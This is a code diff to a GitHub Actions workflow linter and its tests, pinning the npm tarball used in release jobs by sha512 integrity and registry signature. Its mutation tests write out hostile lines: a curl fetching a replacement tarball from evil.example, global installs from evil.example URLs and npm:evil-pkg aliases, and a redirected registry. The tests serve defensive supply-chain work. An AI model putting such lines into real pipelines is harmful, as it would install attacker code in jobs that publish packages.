@@ -370,8 +370,14 @@ if (rule === "mutable") {
           // names: every package in it needs an exact @x.y.z.
           // Options may come before the verb (npm -g install x), and the
           // global flag anywhere on the line (#960 review).
+          // One exception (#1000): npm from the tarball checked against
+          // NPM_INTEGRITY, exactly this line, which npmpin allows only in a
+          // step whose script is, line for line, the version check,
+          // download, sha512 check and this install, in every workflow. A
+          // text check: it holds what the script says, which is what runs
+          // as long as nothing else in the step does.
           const g = /\b(?:npm|pnpm)(?:\s+-\S+)*\s+(?:install|i|add)\b(.*)$/.exec(line);
-          if (g && /(?:^|\s)(?:-g|--global|--location[= ]global)\b/.test(line))
+          if (g && /(?:^|\s)(?:-g|--global|--location[= ]global)\b/.test(line) && raw.trim() !== "npm install -g --offline --ignore-scripts \"$npm_tgz\"")
             for (const tok of g[1].split(/\s+/).filter((x) => x && !x.startsWith("-"))) {
               // The first @ after the name, not the last (#960): in
               // npm@npm:other@1.2.3 the version is an alias that installs
@@ -519,14 +525,15 @@ if (rule === "narrow") {
     };
     const lines = runs.split("\n").map((l) => stripComment(l).trim());
     // npm verbs that run package or repository code, and any global install
-    // that is not npm itself pinned to NPM_VERSION.
+    // that is not npm itself from the tarball checked against NPM_INTEGRITY
+    // (#1000; npmpin holds the checks before that line).
     // Options may come before the verb (#960 review: npm -g install x).
     const npmRuns = cmd("npm(?:\\s+-\\S+)*\\s+(?:ci|install|i|add|isntall|in|it|install-test|install-ci-test|run|run-script|rum|urn|exec|x|pack|rebuild|rb|test|t|tst|start|restart|stop|update|up|upgrade|dedupe|link|ln|explore)\\b");
     // The pinned install is that exact line and nothing else on it: no
     // VAR=value in front (npm_config_registry=...), no other spelling.
     const isGlobal = (line) => /\s(?:-g|--global|--location[= ]global)\b/.test(line);
     const globalOther = (line) => /\bnpm(?:\s+-\S+)*\s+(?:install|i|add)\b/.test(line) && isGlobal(line) &&
-      line.trim() !== "npm install -g \"npm@${NPM_VERSION}\"";
+      line.trim() !== "npm install -g --offline --ignore-scripts \"$npm_tgz\"";
     if (oidc && /\bnpm\b[^\n;&|]*\spublish\b/.test(runs)) {
       if (steps.some((st) => String(st.uses ?? "").startsWith("oven-sh/setup-bun@")))
         out.push(name + ": publishes with id-token and installs Bun");
@@ -642,7 +649,7 @@ if (rule === "narrow") {
         if (u && !allowed.some((a) => u.startsWith(a))) out.push(name + ": uses " + u + " (only setup-node and download-artifact)");
       }
       for (const line of lines)
-        if (globalOther(line)) out.push(name + ": installs something other than npm@${NPM_VERSION} globally: " + line);
+        if (globalOther(line)) out.push(name + ": installs something other than npm from its checked tarball globally: " + line);
       const at = (re) => steps.findIndex((st) => typeof st.run === "string" && re.test(st.run));
       const verify = at(/\bsha256sum\s+-c\b/);
       const publish = at(/\bnpm\s+publish\b/);
@@ -963,38 +970,86 @@ if (rule === "npmpin") {
   // included, and that package would be installed globally with its
   // lifecycle scripts in a job holding id-token. Names compared ignoring
   // case, as a Windows runner does.
-  const isPin = (k) => /^npm_version$/i.test(k);
+  //
+  // #1000: and npm is no longer installed by version at all, which trusted
+  // the registry to serve the right npm to a job that can publish. The one
+  // global install of npm is npmInstall, from a tarball fetched by its fixed
+  // URL and checked against NPM_INTEGRITY on the lines right before it, so
+  // NPM_INTEGRITY is a pin too: set once, at the top, beside NPM_VERSION.
+  const isPin = (k) => /^npm_(?:version|integrity)$/i.test(k);
   const npmCheck = "[[ \"$NPM_VERSION\" =~ ^[0123456789]+\\.[0123456789]+\\.[0123456789]+$ ]] || { echo \"::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)\"; exit 1; }";
+  const npmInstall = "npm install -g --offline --ignore-scripts \"$npm_tgz\"";
+  const npmBlock = [npmCheck,
+    "npm_tgz=\"$(mktemp -d /tmp/npm.XXXXXXXXXX)/npm-${NPM_VERSION}.tgz\"",
+    "curl -fsS --proto \x27=https\x27 --retry 3 --max-time 300 --max-filesize 67108864 -o \"$npm_tgz\" \"https://registry.npmjs.org/npm/-/npm-${NPM_VERSION}.tgz\" || { echo \"::error::could not download npm-${NPM_VERSION}.tgz from the registry (#1000)\"; exit 1; }",
+    "got=\"sha512-$(openssl dgst -sha512 -binary \"$npm_tgz\" | base64 -w0)\"",
+    "[ \"$got\" = \"$NPM_INTEGRITY\" ] || { echo \"::error::npm-${NPM_VERSION}.tgz from the registry is ${got}, not the pinned NPM_INTEGRITY (#1000)\"; exit 1; }",
+    npmInstall];
+  // ...and that block is the whole step, line for line (review of #1000):
+  // a window of lines before the install let a function or an alias
+  // defined above it (curl, base64), or a heredoc opener that turned the
+  // block into data, through. Comment lines are skipped; any code line
+  // that opens a heredoc or a string is itself an extra line here.
+  const npmStep = ["set -euo pipefail", ...npmBlock,
+    "got=\"$(npm --version)\"",
+    "[ \"$got\" = \"$NPM_VERSION\" ] || { echo \"::error::npm on PATH is $got, expected $NPM_VERSION\"; exit 1; }"];
+  // Any other global install of npm, by version or alias, or of a spec
+  // that names NPM_VERSION.
+  const npmByVersion = (l) => /npm@\$\{?npm_version\b/i.test(l) ||
+    (/\bnpm(?:\s+-\S+)*\s+(?:install|i|add)\b/.test(l) && /(?:^|\s)(?:-g|--global|--location[= ]global)\b/.test(l) && /(?:^|\s)["\x27]?npm@/.test(l));
   for (const e of [doc.env, ...Object.values(jobs).map((j) => j.env)])
     for (const v of Object.values(e ?? {}))
-      if (/^\s*npm_version\s*=/im.test(String(v))) out.push("an env value sets NPM_VERSION when written to GITHUB_ENV: " + JSON.stringify(v));
-  for (const [k, v] of Object.entries(doc.env ?? {}))
-    if (isPin(k) && !/^\d+\.\d+\.\d+$/.test(String(v))) out.push("env." + k + " is " + JSON.stringify(v) + ", not an exact x.y.z");
+      for (const n of ["NPM_VERSION", "NPM_INTEGRITY"])
+        if (new RegExp("^\\s*" + n + "\\s*=", "im").test(String(v))) out.push("an env value sets " + n + " when written to GITHUB_ENV: " + JSON.stringify(v));
+  for (const [k, v] of Object.entries(doc.env ?? {})) {
+    if (/^npm_version$/i.test(k) && !/^\d+\.\d+\.\d+$/.test(String(v))) out.push("env." + k + " is " + JSON.stringify(v) + ", not an exact x.y.z");
+    if (/^npm_integrity$/i.test(k) && !/^sha512-[A-Za-z0-9+\/]{86}==$/.test(String(v))) out.push("env." + k + " is " + JSON.stringify(v) + ", not a sha512 integrity");
+  }
+  // The two move together (#1000): a pin of one without the other cannot
+  // install anything, and fails the release instead of this check.
+  const topKeys = Object.keys(doc.env ?? {});
+  const installs = Object.values(jobs).some((j) => flatSteps(j.steps).some(({ st }) => typeof st.run === "string" && st.run.split("\n").some((l) => l.trim() === npmInstall)));
+  for (const n of ["NPM_VERSION", "NPM_INTEGRITY"])
+    if (!topKeys.includes(n) && (installs || topKeys.some((k) => isPin(k))))
+      out.push("the workflow " + (installs ? "installs npm" : "pins " + topKeys.filter(isPin).join(", ")) + " but sets no " + n + " at the top");
   for (const [name, job] of Object.entries(jobs)) {
     for (const k of Object.keys(job.env ?? {})) if (isPin(k)) out.push(name + ": sets " + k + " over the workflow pin");
     for (const k of Object.keys(job.container?.env ?? {})) if (isPin(k)) out.push(name + ": its container sets " + k + " over the workflow pin");
     for (const [i, { st, via }] of flatSteps(job.steps).entries()) {
       const label = name + ": step " + (via ? "(via " + via.slice(0, -3) + ") " : "") + (st.name ?? st.id ?? st.uses ?? String(i));
       for (const k of Object.keys(st.env ?? {})) if (isPin(k)) out.push(label + " sets " + k + " over the workflow pin");
-      // The pinned install is checked where it runs (#960 review): the line
-      // before it in the same script is the exact x.y.z test, so a value set
-      // any way this rule cannot read (a default shell, BASH_ENV, a sourced
-      // file, a GITHUB_ENV line built from env) still stops the step.
-      const code = (typeof st.run === "string" ? st.run : "").split("\n").map((l) => l.trim()).filter((l) => l && !l.startsWith("#"));
+      // The pinned install is checked where it runs (#960 review): the lines
+      // before it in the same script are the exact x.y.z test, then (#1000)
+      // the download of that version by its fixed URL into a fresh
+      // directory and the sha512 check against NPM_INTEGRITY, nothing in
+      // between, so a value set any way this rule cannot read (a default
+      // shell, BASH_ENV, a sourced file, a GITHUB_ENV line built from env)
+      // still stops the step, and so does a registry serving other bytes.
+      const code = (typeof st.run === "string" ? st.run : "").split("\n").map((l) => l.replace(/^[ \t]+|[ \t]+$/g, "")).filter((l) => l && !l.startsWith("#"));
       code.forEach((l, j) => {
-        if (/npm@\$\{?npm_version\b/i.test(l) && code[j - 1] !== npmCheck)
-          out.push(label + " installs npm@${NPM_VERSION} without the exact-version check on the line before it");
+        if (l === npmInstall && (j < 5 || code.slice(j - 5, j).some((x, n) => x !== npmBlock[n])))
+          out.push(label + " installs npm without the exact-version check and the sha512 check of its tarball on the lines before it (#960, #1000)");
+        else if (l === npmInstall && (code.length !== npmStep.length || code.some((x, n) => x !== npmStep[n])))
+          out.push(label + " installs npm in a script that is not exactly the one this rule allows (#1000 review): " + JSON.stringify(code.filter((x, n) => x !== npmStep[n])));
+        // Nor in a step whose shell or env could run code before the
+        // script: the env the step needs is all at the workflow top.
+        if (l === npmInstall && (st.shell !== undefined || job.defaults?.run?.shell !== undefined || doc.defaults?.run?.shell !== undefined || st.env !== undefined))
+          out.push(label + " installs npm in a step with a shell: or env: of its own, or a default shell (#1000 review)");
+        if (npmByVersion(l))
+          out.push(label + " installs npm by version, not from a tarball checked against NPM_INTEGRITY (#1000): " + l);
       });
-      if (code.some((l) => /npm@\$\{?npm_version\b/i.test(l)) && (st["continue-on-error"] !== undefined || job["continue-on-error"] !== undefined))
-        out.push(label + " installs npm@${NPM_VERSION} in a step or job that may continue on error");
+      if (code.some((l) => l === npmInstall || npmByVersion(l)) && (st["continue-on-error"] !== undefined || job["continue-on-error"] !== undefined))
+        out.push(label + " installs npm in a step or job that may continue on error");
       for (const v of Object.values(st.env ?? {}))
-        if (/^\s*npm_version\s*=/im.test(String(v))) out.push(label + " has an env value that sets NPM_VERSION when written to GITHUB_ENV");
+        for (const n of ["NPM_VERSION", "NPM_INTEGRITY"])
+          if (new RegExp("^\\s*" + n + "\\s*=", "im").test(String(v))) out.push(label + " has an env value that sets " + n + " when written to GITHUB_ENV");
       // An assignment (plain, +=, ${X:=...}, export and friends, read,
       // printf -v) or a GITHUB_ENV line, which is the same text; comments
       // dropped.
       const run = (typeof st.run === "string" ? st.run : "").split("\n").filter((l) => !/^\s*#/.test(l)).join("\n");
-      if (/(?:^|[\s;&|(`"\x27])npm_version\+?=|\$\{npm_version:?=|\b(?:export|declare|typeset|local|readonly|read)\s+(?:-\w+\s+)*npm_version\b|\bprintf\s+-v\s*npm_version\b/im.test(run))
-        out.push(label + " sets NPM_VERSION in its script (for itself, or for later steps through GITHUB_ENV)");
+      for (const n of ["npm_version", "npm_integrity"])
+        if (new RegExp("(?:^|[\\s;&|(`\"\\x27])" + n + "\\+?=|\\$\\{" + n + ":?=|\\b(?:export|declare|typeset|local|readonly|read)\\s+(?:-\\w+\\s+)*" + n + "\\b|\\bprintf\\s+-v\\s*" + n + "\\b", "im").test(run))
+          out.push(label + " sets " + n.toUpperCase() + " in its script (for itself, or for later steps through GITHUB_ENV)");
     }
   }
 }
@@ -1080,11 +1135,126 @@ if [ "$(printf '%s\n' "$npm_pins" | wc -l)" -eq 1 ] && [[ "$npm_pins" =~ ^\"[0-9
 else
 	no "release-exec.yml and sidecar-release.yml pin the same exact npm" "got: ${npm_pins}"
 fi
+# ...from the same tarball (#1000): one NPM_VERSION and NPM_INTEGRITY pair
+# across both, and that pair is what the registry holds. A version bumped
+# without its integrity, or with a wrong one, fails here instead of at the
+# install step of a release. This asks registry.npmjs.org (the packument,
+# then the tarball itself, hashed here), as the bun install in the same CI
+# job does, and fails if it cannot.
+# npm_pin_check <workflow dir>: one violation per line, nothing when clean.
+npm_pin_check() {
+	# shellcheck disable=SC2016 # JavaScript source, not shell.
+	DIR="$1" bun -e '
+const fs = require("node:fs");
+const out = [];
+const pins = new Set(["release-exec.yml", "sidecar-release.yml"].map((f) => {
+  const e = Bun.YAML.parse(fs.readFileSync(process.env.DIR + "/" + f, "utf8")).env ?? {};
+  return JSON.stringify([e.NPM_VERSION ?? null, e.NPM_INTEGRITY ?? null]);
+}));
+if (pins.size !== 1) out.push("release-exec.yml and sidecar-release.yml pin different npm tarballs: " + [...pins].join(" and "));
+const [v, want] = JSON.parse([...pins][0]);
+if (!/^\d+\.\d+\.\d+$/.test(String(v)) || !/^sha512-[A-Za-z0-9+\/]{86}==$/.test(String(want))) out.push("NPM_VERSION " + JSON.stringify(v) + " and NPM_INTEGRITY " + JSON.stringify(want) + " are not an exact version and a sha512 integrity");
+else {
+  const url = "https://registry.npmjs.org/npm/-/npm-" + v + ".tgz";
+  try {
+    const r = await fetch("https://registry.npmjs.org/npm/" + v, { signal: AbortSignal.timeout(Number(process.env.NPM_PIN_TIMEOUT_MS || 60000)) });
+    if (r.status !== 200) out.push("the registry answered HTTP " + r.status + " for npm@" + v + ", so the pin could not be checked");
+    else {
+      const m = await r.json();
+      if (m.version !== v) out.push("the registry answered for npm@" + JSON.stringify(m.version) + ", not npm@" + v);
+      // npm versions are immutable, so this means one of two things (review
+      // of #1000): NPM_VERSION was bumped without its integrity, or the
+      // registry now serves other bytes for a version already pinned.
+      if (m.dist?.integrity !== want) out.push("the registry dist.integrity for npm@" + v + " is " + JSON.stringify(m.dist?.integrity) + ", not NPM_INTEGRITY " + want +
+        ": if NPM_VERSION was just bumped, bump NPM_INTEGRITY with it, after checking the value against a second source; if it was not, an immutable version changed: do not re-pin, find out why");
+      // Signed, for exactly this name, version and integrity, by the npm
+      // registry key pinned here, not one fetched beside the packument
+      // (review of #1000): a path that can rewrite the packument could
+      // serve keys to match. The key is the one /-/npm/v1/keys listed on
+      // 2026-10-14 (expires null), and the same keyid and key are in the
+      // registry.npmjs.org delegation of the Sigstore TUF repository
+      // (tuf-repo-cdn.sigstore.dev, keys.json sha256 160677eb...). It
+      // still is the registry own key, so it is no defence against the
+      // registry itself. If npm rotates it, this fails: pin the new key
+      // after checking it there.
+      const npmKeyId = "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U";
+      const npmKey = "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEY6Ya7W++7aUPzvMTrezH6Ycx3c+HOKYCcNGybJZSCJq/fd7Qa8uuAKtdIkUQtQiEKERhAmE5lMMJhP8OkDOa2g==";
+      const crypto = require("node:crypto");
+      const pub = crypto.createPublicKey({ key: Buffer.from(npmKey, "base64"), format: "der", type: "spki" });
+      const sigs = Array.isArray(m.dist?.signatures) ? m.dist.signatures : [];
+      const good = sigs.filter((sg) => sg.keyid === npmKeyId &&
+        crypto.verify("sha256", Buffer.from("npm@" + v + ":" + want), pub, Buffer.from(String(sg.sig), "base64")));
+      if (!good.length) out.push("no registry signature over npm@" + v + ":" + want + " verifies with the pinned npm registry key " + npmKeyId);
+      if (m.dist?.tarball !== url) out.push("the registry serves npm@" + v + " from " + JSON.stringify(m.dist?.tarball) + ", not " + url + ", which the install step fetches");
+      const t = await fetch(url, { redirect: "error", signal: AbortSignal.timeout(120000) });
+      if (t.status !== 200) out.push("the registry answered HTTP " + t.status + " for " + url + ", so the pin could not be checked");
+      else {
+        const got = "sha512-" + new Bun.CryptoHasher("sha512").update(new Uint8Array(await t.arrayBuffer())).digest("base64");
+        if (got !== want) out.push(url + " has sha512 " + got + ", not NPM_INTEGRITY " + want);
+      }
+    }
+  } catch (err) {
+    out.push("could not check npm@" + v + " against the registry (" + String(err) + "), so this check fails rather than pass unchecked");
+  }
+}
+if (out.length) console.log(out.join("\n"));
+'
+}
+found="$(npm_pin_check "$WORKFLOWS")" || found="the npm pin check itself failed (exit $?): $found"
+if [ -z "$found" ]; then
+	ok "NPM_INTEGRITY is the sha512 the registry holds and serves for NPM_VERSION, in both npm publishers (#1000)"
+else
+	no "NPM_INTEGRITY is the sha512 the registry holds and serves for NPM_VERSION, in both npm publishers (#1000)" "$found"
+fi
+# npm_pin_caught <label> <reason> <file> <exact text> <replacement> [<file> <exact text> <replacement>]
+npm_pin_caught() {
+	local label="$1" reason="$2"
+	shift 2
+	rm -rf "${WORK}/npmpin" && cp -rL "$WORKFLOWS" "${WORK}/npmpin"
+	while [ "$#" -ge 3 ]; do
+		if ! FROM="${WORK}/npmpin/$1" OLD="$2" NEW="$3" bun -e '
+const s = await Bun.file(process.env.FROM).text();
+if (!s.includes(process.env.OLD)) process.exit(2);
+await Bun.write(process.env.FROM, s.replace(process.env.OLD, process.env.NEW));
+'; then
+			no "npm pin mutant '${label}' could be applied ($1 no longer has the text it mutates)"
+			return
+		fi
+		shift 3
+	done
+	found="$(npm_pin_check "${WORK}/npmpin")" || found="the npm pin check itself failed (exit $?): $found"
+	if grep -qF -- "$reason" <<<"$found"; then ok "reports: ${label}"; else no "reports: ${label}, for the reason it exists" "wanted '${reason}', got: ${found}"; fi
+}
+# The registry out of reach (a proxy that refuses) fails the check rather
+# than passing it unchecked (review of #1000).
+found="$(NPM_PIN_TIMEOUT_MS=5000 HTTPS_PROXY=http://127.0.0.1:1 https_proxy=http://127.0.0.1:1 npm_pin_check "$WORKFLOWS")" || found="the npm pin check itself failed (exit $?): $found"
+if grep -qF 'so this check fails rather than pass unchecked' <<<"$found"; then
+	ok "reports: the registry out of reach, rather than passing unchecked (#1000 review)"
+else
+	no "reports: the registry out of reach, rather than passing unchecked (#1000 review)" "got: ${found}"
+fi
+npm_pin_caught 'NPM_VERSION bumped in both publishers without NPM_INTEGRITY (#1000)' \
+	'the registry dist.integrity for npm@12.2.0 is' \
+	release-exec.yml '  NPM_VERSION: "12.1.0"' '  NPM_VERSION: "12.2.0"' \
+	sidecar-release.yml '  NPM_VERSION: "12.1.0"' '  NPM_VERSION: "12.2.0"'
+npm_pin_caught 'NPM_INTEGRITY bumped in one publisher only (#1000)' \
+	'pin different npm tarballs' \
+	sidecar-release.yml '  NPM_INTEGRITY: "sha512-' '  NPM_INTEGRITY: "sha512-A'
+npm_pin_caught 'NPM_INTEGRITY wrong in both publishers, seen in the registry signatures (#1000 security review)' \
+	'no registry signature over npm@12.1.0:sha512-AAAA' \
+	release-exec.yml '  NPM_INTEGRITY: "sha512-' '  NPM_INTEGRITY: "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" #' \
+	sidecar-release.yml '  NPM_INTEGRITY: "sha512-' '  NPM_INTEGRITY: "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" #'
+npm_pin_caught 'NPM_INTEGRITY wrong in both publishers (#1000)' \
+	'the registry dist.integrity for npm@12.1.0 is' \
+	release-exec.yml '  NPM_INTEGRITY: "sha512-' '  NPM_INTEGRITY: "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" #' \
+	sidecar-release.yml '  NPM_INTEGRITY: "sha512-' '  NPM_INTEGRITY: "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" #'
 # ...and nothing below the workflow level sets NPM_VERSION again (#960), in
-# any workflow: the npm publishers exempt `npm install -g "npm@${NPM_VERSION}"`
-# by its text, so the variable has to be the pin wherever that line runs.
+# any workflow: the npm publishers exempt the pinned npm install by its
+# text, so the variable has to be the pin wherever that line runs; nor
+# (#1000) NPM_INTEGRITY, and npm is installed only from the tarball checked
+# against it, never by version.
 for f in "$WORKFLOWS"/*.yml; do
-	expect_clean "$(basename "$f"): NPM_VERSION is set once, at the top, to an exact version" npmpin "$f"
+	expect_clean "$(basename "$f"): NPM_VERSION and NPM_INTEGRITY are set once, at the top, and npm is installed only from the checked tarball" npmpin "$f"
 done
 # shellcheck disable=SC2016 # literal workflow text, not shell.
 {
@@ -1104,7 +1274,7 @@ done
 		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          export NPM_VERSION=npm:evil-pkg@12.1.0\n          # Checked where it is used' \
 		'sets NPM_VERSION in its script'
 	expect_caught 'NPM_VERSION defaulted with := in the script (#960)' npmpin "$WORKFLOWS/release-exec.yml" \
-		'          npm install -g "npm@${NPM_VERSION}"' '          npm install -g "npm@${NPM_VERSION:=npm:evil-pkg@12.1.0}"' \
+		'          npm_tgz="$(mktemp -d /tmp/npm.XXXXXXXXXX)/npm-${NPM_VERSION}.tgz"' '          npm_tgz="$(mktemp -d /tmp/npm.XXXXXXXXXX)/npm-${NPM_VERSION:=npm:evil-pkg@12.1.0}.tgz"' \
 		'sets NPM_VERSION in its script'
 	expect_caught 'the workflow pin itself an npm: alias (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
 		'  NPM_VERSION: "12.1.0"' '  NPM_VERSION: "npm:evil-pkg@12.1.0"' \
@@ -1116,22 +1286,22 @@ done
 		$'jobs:\n' $'jobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    env:\n      NPM_VERSION: "npm:evil-pkg@12.1.0"\n    steps:\n      - run: npm install -g "npm@${NPM_VERSION}"\n' \
 		'sneak: sets NPM_VERSION over the workflow pin'
 	expect_caught 'a global install of npm through an npm: alias (#960)' mutable "$WORKFLOWS/release-exec.yml" \
-		'          npm install -g "npm@${NPM_VERSION}"' '          npm install -g "npm@npm:evil-pkg@12.1.0"' \
+		'          npm install -g --offline --ignore-scripts "$npm_tgz"' '          npm install -g "npm@npm:evil-pkg@12.1.0"' \
 		'global install of npm@npm:evil-pkg@12.1.0 is not an exact version'
 	expect_caught 'a global install of a scoped package through an alias (#960)' mutable "$WORKFLOWS/release-exec.yml" \
-		'          npm install -g "npm@${NPM_VERSION}"' '          npm install -g "@scope/tool@npm:evil-pkg@1.0.0"' \
+		'          npm install -g --offline --ignore-scripts "$npm_tgz"' '          npm install -g "@scope/tool@npm:evil-pkg@1.0.0"' \
 		'global install of @scope/tool@npm:evil-pkg@1.0.0 is not an exact version'
 	expect_caught 'a global install with the flag before the verb (#960 review)' mutable "$WORKFLOWS/release-exec.yml" \
-		'          npm install -g "npm@${NPM_VERSION}"' '          npm -g install "npm@npm:evil-pkg@12.1.0"' \
+		'          npm install -g --offline --ignore-scripts "$npm_tgz"' '          npm -g install "npm@npm:evil-pkg@12.1.0"' \
 		'global install of npm@npm:evil-pkg@12.1.0 is not an exact version'
 	expect_caught 'a global install of a URL (#960 review)' mutable "$WORKFLOWS/release-exec.yml" \
-		'          npm install -g "npm@${NPM_VERSION}"' '          npm i -g https://evil.example/x@1.2.3' \
+		'          npm install -g --offline --ignore-scripts "$npm_tgz"' '          npm i -g https://evil.example/x@1.2.3' \
 		'global install of https://evil.example/x@1.2.3 is not an exact version'
 	expect_caught 'the alias installed with the flag first in the npm publish job (#960 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
-		'          npm install -g "npm@${NPM_VERSION}"' $'          npm install -g "npm@${NPM_VERSION}"\n          npm -g install "npm@npm:evil-pkg@12.1.0"' \
+		'          npm install -g --offline --ignore-scripts "$npm_tgz"' $'          npm install -g --offline --ignore-scripts "$npm_tgz"\n          npm -g install "npm@npm:evil-pkg@12.1.0"' \
 		'publish-sidecar: publishes with id-token and runs: npm -g install'
 	expect_caught 'the pinned install pointed at another registry on its own line (#960 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
-		'          npm install -g "npm@${NPM_VERSION}"' '          npm_config_registry=https://registry.evil.example/ npm install -g "npm@${NPM_VERSION}"' \
+		'          npm install -g --offline --ignore-scripts "$npm_tgz"' '          npm_config_registry=https://registry.evil.example/ npm install -g --offline --ignore-scripts "$npm_tgz"' \
 		'publish-sidecar: publishes with id-token and runs: npm_config_registry='
 	expect_caught 'npm_config_registry in the npm publish job env (#960 review)' narrow "$WORKFLOWS/release-exec.yml" \
 		$'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n    env:\n      npm_config_registry: https://registry.evil.example/\n' \
@@ -1147,13 +1317,24 @@ done
 		'publish-brain: step with shell: bash -c'
 	expect_caught 'the pinned install without its exact-version check (#960 review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
 		$'          [[ "$NPM_VERSION" =~ ^[0123456789]+\.[0123456789]+\.[0123456789]+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }\n' '' \
-		'publish-sidecar: step Ensure npm supports Trusted Publishing installs npm@${NPM_VERSION} without the exact-version check'
+		'publish-sidecar: step Ensure npm supports Trusted Publishing installs npm without the exact-version check'
 	expect_caught 'the exact-version check loosened (#960 review)' npmpin "$WORKFLOWS/release-exec.yml" \
 		'          [[ "$NPM_VERSION" =~ ^[0123456789]+\.[0123456789]+\.[0123456789]+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }' '          [[ "$NPM_VERSION" =~ ^.+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }' \
-		'installs npm@${NPM_VERSION} without the exact-version check'
+		'installs npm without the exact-version check'
+	# The check moved below the install: the text from the check to the
+	# install (#1000 put the download and sha512 check in between) is read
+	# from the workflow, and only its first line moves.
+	npm_blk="$(FILE="$WORKFLOWS/sidecar-release.yml" bun -e '
+const s = await Bun.file(process.env.FILE).text();
+const a = s.indexOf("          [[ \"$NPM_VERSION\" =~");
+const end = "          npm install -g --offline --ignore-scripts \"$npm_tgz\"";
+const b = s.indexOf(end, a);
+if (a < 0 || b < 0) process.exit(2);
+process.stdout.write(s.slice(a, b + end.length));
+')" || npm_blk="(the block was not found)"
 	expect_caught 'the exact-version check after the install (#960 review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
-		$'          [[ "$NPM_VERSION" =~ ^[0123456789]+\.[0123456789]+\.[0123456789]+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }\n          npm install -g "npm@${NPM_VERSION}"\n' $'          npm install -g "npm@${NPM_VERSION}"\n          [[ "$NPM_VERSION" =~ ^[0123456789]+\.[0123456789]+\.[0123456789]+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }\n' \
-		'installs npm@${NPM_VERSION} without the exact-version check'
+		"$npm_blk" "${npm_blk#*$'\n'}"$'\n'"${npm_blk%%$'\n'*}" \
+		'installs npm without the exact-version check'
 	expect_caught 'the pinned install in a step that may continue on error (#960 review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
 		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        continue-on-error: true\n        run: |' \
 		'may continue on error'
@@ -1169,6 +1350,57 @@ done
 	expect_caught 'NPM_VERSION set by printf -v (#960 review)' npmpin "$WORKFLOWS/release-exec.yml" \
 		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          printf -v NPM_VERSION %s x\n          # Checked where it is used' \
 		'sets NPM_VERSION in its script'
+	expect_caught 'the npm tarball installed without its sha512 check (#1000)' npmpin "$WORKFLOWS/release-exec.yml" \
+		$'          [ "$got" = "$NPM_INTEGRITY" ] || { echo "::error::npm-${NPM_VERSION}.tgz from the registry is ${got}, not the pinned NPM_INTEGRITY (#1000)"; exit 1; }\n' '' \
+		'pack-brain: step Install the pinned npm installs npm without the exact-version check and the sha512 check of its tarball'
+	expect_caught 'the sha512 check loosened to any digest (#1000)' npmpin "$WORKFLOWS/sidecar-release.yml" \
+		'          [ "$got" = "$NPM_INTEGRITY" ] ||' '          [ -n "$got" ] ||' \
+		'publish-sidecar: step Ensure npm supports Trusted Publishing installs npm without the exact-version check and the sha512 check'
+	expect_caught 'the npm tarball fetched from another host (#1000)' npmpin "$WORKFLOWS/release-exec.yml" \
+		'"https://registry.npmjs.org/npm/-/npm-${NPM_VERSION}.tgz"' '"https://registry.evil.example/npm-${NPM_VERSION}.tgz"' \
+		'pack-brain: step Install the pinned npm installs npm without the exact-version check and the sha512 check'
+	expect_caught 'a step between the sha512 check and the install (#1000)' npmpin "$WORKFLOWS/sidecar-release.yml" \
+		'          npm install -g --offline --ignore-scripts "$npm_tgz"' $'          curl -fsS -o "$npm_tgz" https://evil.example/npm.tgz\n          npm install -g --offline --ignore-scripts "$npm_tgz"' \
+		'publish-sidecar: step Ensure npm supports Trusted Publishing installs npm without the exact-version check and the sha512 check'
+	expect_caught 'npm installed by version again, in the job that packs (#1000)' npmpin "$WORKFLOWS/release-exec.yml" \
+		'          npm install -g --offline --ignore-scripts "$npm_tgz"' '          npm install -g "npm@${NPM_VERSION}"' \
+		'pack-brain: step Install the pinned npm installs npm by version, not from a tarball checked against NPM_INTEGRITY'
+	expect_caught 'npm installed by a literal version in a workflow with no pin (#1000)' npmpin "$WORKFLOWS/test.yml" \
+		$'jobs:\n' $'jobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    steps:\n      - run: npm i -g npm@12.1.0\n' \
+		'sneak: step 0 installs npm by version, not from a tarball checked against NPM_INTEGRITY'
+	expect_caught 'a step setting NPM_INTEGRITY over the pin (#1000)' npmpin "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          NPM_INTEGRITY: sha512-x\n        run: |' \
+		'publish-brain: step Ensure npm supports Trusted Publishing sets NPM_INTEGRITY over the workflow pin'
